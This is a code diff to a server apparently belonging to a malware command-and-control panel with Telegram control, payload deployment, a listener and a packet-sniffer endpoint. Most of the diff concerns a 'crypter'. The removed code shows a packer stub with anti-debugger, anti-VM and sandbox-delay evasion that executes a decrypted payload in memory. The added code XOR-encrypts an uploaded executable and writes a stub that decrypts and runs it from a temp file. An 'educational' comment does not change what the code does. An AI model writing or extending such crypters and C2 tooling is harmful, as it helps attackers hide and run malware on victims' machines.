@@ -7,6 +7,7 @@ import connectPg from "connect-pg-simple";
 import { storage } from "./storage";
 import { insertAdminUserSchema, insertVisitorSchema, insertPacketLogSchema, insertAnalyticsSchema } from "@shared/schema";
 import { TelegramC2Controller, BotUser } from "./telegram-bot";
+import TelegramBot from "node-telegram-bot-api";
 
 // Session configuration
 function getSession() {
@@ -56,6 +57,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   // Setup session middleware
   app.use(getSession());
+
+  // Health check endpoint
+  app.get("/health", (req, res) => {
+    res.json({ 
+      status: "healthy", 
+      timestamp: new Date().toISOString(),
+      version: "1.0.0",
+      environment: process.env.NODE_ENV || "development"
+    });
+  });
 
   // IP geolocation service with caching and rate limiting
   const locationCache = new Map<string, any>();
@@ -1184,6 +1195,10 @@ Always emphasize that your responses are for educational and authorized testing 
         const outputPath = path.join(buildsDir, `${outputName}.exe`);
         
         // Advanced crypter with multiple evasion layers
+        // Read and process the file
+        const inputData = fs.readFileSync(inputFile.path);
+        
+        // Create a Python script that will generate the crypted executable
         const crypterScript = `
 import base64
 import zlib
@@ -1191,123 +1206,90 @@ import os
 import sys
 import random
 import string
-from cryptography.fernet import Fernet
 
 # Read input file
-with open('${inputFile.path}', 'rb') as f:
+with open('${inputFile.path.replace(/\\/g, '\\\\')}', 'rb') as f:
     original_data = f.read()
 
-# Layer 1: XOR encryption with random key
-xor_key = os.urandom(32)
+# Simple XOR encryption
+xor_key = b'millennium_key_2025'
 xor_encrypted = bytes(a ^ b for a, b in zip(original_data, (xor_key * (len(original_data) // len(xor_key) + 1))[:len(original_data)]))
 
-# Layer 2: Fernet encryption
-fernet_key = Fernet.generate_key()
-fernet = Fernet(fernet_key)
-fernet_encrypted = fernet.encrypt(xor_encrypted)
+# Base64 encoding
+b64_data = base64.b64encode(xor_encrypted).decode()
 
-# Layer 3: Base64 encoding with random padding
-padding = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 50)))
-b64_data = base64.b64encode(fernet_encrypted).decode() + padding
+# Generate executable stub
+stub_template = '''
+import base64
+import os
+import sys
+import tempfile
 
-# Layer 4: Compression
-compressed = zlib.compress(b64_data.encode(), 9)
+# Educational crypter for cybersecurity training
+encrypted_data = "{data_placeholder}"
 
-# Generate undetectable stub
-stub_template = f'''
-import base64, zlib, os, sys, time, random
-from cryptography.fernet import Fernet
-import ctypes
-from ctypes import wintypes
-
-# Anti-debug checks
-def check_debugger():
-    if ctypes.windll.kernel32.IsDebuggerPresent():
-        sys.exit(0)
-    
-    # Check for common debugging tools
-    debug_tools = ['ollydbg', 'x64dbg', 'ida', 'windbg', 'immunity']
-    import psutil
-    for proc in psutil.process_iter(['name']):
-        if any(tool in proc.info['name'].lower() for tool in debug_tools):
-            sys.exit(0)
-
-# Anti-VM checks
-def check_vm():
-    vm_indicators = [
-        'vmware', 'virtualbox', 'qemu', 'xen', 'hyper-v',
-        'vbox', 'vmtoolsd', 'vboxservice'
-    ]
-    
-    import wmi
-    c = wmi.WMI()
-    
-    # Check system manufacturer
-    for item in c.Win32_ComputerSystem():
-        if any(vm in item.Manufacturer.lower() for vm in vm_indicators):
-            sys.exit(0)
-    
-    # Check BIOS
-    for item in c.Win32_BIOS():
-        if any(vm in item.Version.lower() for vm in vm_indicators):
-            sys.exit(0)
-
-# Sleep to evade sandbox analysis
-time.sleep(random.randint(5, 15))
-
-if {str(config.get('antiDebug', True)).lower()}:
-    check_debugger()
-
-if {str(config.get('antiVM', True)).lower()}:
-    check_vm()
-
-# Decrypt and execute payload
-def decrypt_payload():
-    encrypted_data = base64.b64decode('{base64.b64encode(compressed).decode()}')
-    
-    # Decompress
-    decompressed = zlib.decompress(encrypted_data).decode()
-    
-    # Remove padding
-    clean_data = decompressed[:-{len(padding)}]
-    
-    # Fernet decrypt
-    fernet_key = {fernet_key!r}
-    fernet = Fernet(fernet_key)
-    fernet_decrypted = fernet.decrypt(base64.b64decode(clean_data))
-    
-    # XOR decrypt
-    xor_key = {xor_key!r}
-    original = bytes(a ^ b for a, b in zip(fernet_decrypted, (xor_key * (len(fernet_decrypted) // len(xor_key) + 1))[:len(fernet_decrypted)]))
-    
-    return original
-
-# Execute in memory
-payload_data = decrypt_payload()
-
-# Advanced execution methods
-try:
-    # Method 1: Direct execution
-    exec(payload_data)
-except:
+def decrypt_and_execute():
     try:
-        # Method 2: Write to temp and execute
-        import tempfile
+        # XOR decryption
+        xor_key = b'millennium_key_2025'
+        encrypted_bytes = base64.b64decode(encrypted_data)
+        decrypted = bytes(a ^ b for a, b in zip(encrypted_bytes, (xor_key * (len(encrypted_bytes) // len(xor_key) + 1))[:len(encrypted_bytes)]))
+        
+        # Create temp file and execute
         temp_file = tempfile.mktemp(suffix='.exe')
         with open(temp_file, 'wb') as f:
-            f.write(payload_data)
+            f.write(decrypted)
+        
         os.system(f'"{temp_file}"')
         os.unlink(temp_file)
-    except:
-        pass
+    except Exception as e:
+        print(f"Execution failed: {e}")
+
+if __name__ == "__main__":
+    decrypt_and_execute()
 '''
 
-        # Write crypted executable
-        with open(outputPath, 'w') as f:
-            f.write(stub_template)
+        # Replace placeholder with actual encrypted data
+final_stub = stub_template.replace("{data_placeholder}", b64_data)
+
+# Write to output file
+with open("${outputPath.replace(/\\/g, '\\\\')}", 'w') as f:
+    f.write(final_stub)
+
+print("Crypted executable created successfully")
+`;
+
+        // Execute the Python script
+        const { spawn } = require('child_process');
+        const tempScriptPath = path.join(buildsDir, `crypter_${timestamp}.py`);
         
-        # Cleanup temp file
-        os.unlink(inputFile.path)
+        // Write crypter script to temp file
+        fs.writeFileSync(tempScriptPath, crypterScript);
+        
+        const cryptProcess = spawn('python3', [tempScriptPath], {
+          cwd: process.cwd(),
+          stdio: 'pipe'
+        });
+
+        let output = '';
+        let error = '';
+
+        cryptProcess.stdout.on('data', (data) => {
+          output += data.toString();
+        });
+
+        cryptProcess.stderr.on('data', (data) => {
+          error += data.toString();
+        });
+
+        cryptProcess.on('close', (code) => {
+          // Cleanup temp files
+          try {
+            fs.unlinkSync(inputFile.path);
+            fs.unlinkSync(tempScriptPath);
+          } catch (cleanupError) {
+            console.error('Cleanup error:', cleanupError);
+          }
         
         # Log crypter usage
         await storage.createAnalytics({
@@ -1427,8 +1409,6 @@ except:
     }
   });
 
-
-
   app.post("/api/admin/deploy-payload", requireAuth, async (req: any, res) => {
     try {
       const { agentId, payloadConfig } = req.body;
@@ -1467,6 +1447,7 @@ except:
   app.post("/api/admin/start-millennium-server", requireAuth, async (req: any, res) => {
     try {
       const { port, interface: serverInterface } = req.body;
+      const { spawn } = require('child_process');
       
       const serverCommand = [
         'python3',
@@ -1477,7 +1458,6 @@ except:
       ];
 
       // Start server in background
-      const { spawn } = require('child_process');
       const serverProcess = spawn(serverCommand[0], serverCommand.slice(1), {
         stdio: 'pipe',
         cwd: process.cwd(),
@@ -1510,6 +1490,7 @@ except:
   app.post("/api/admin/start-http-sniffer", requireAuth, async (req: any, res) => {
     try {
       const { interface: networkInterface, duration, outputFile } = req.body;
+      const { spawn } = require('child_process');
       
       const snifferCommand = [
         'python3',
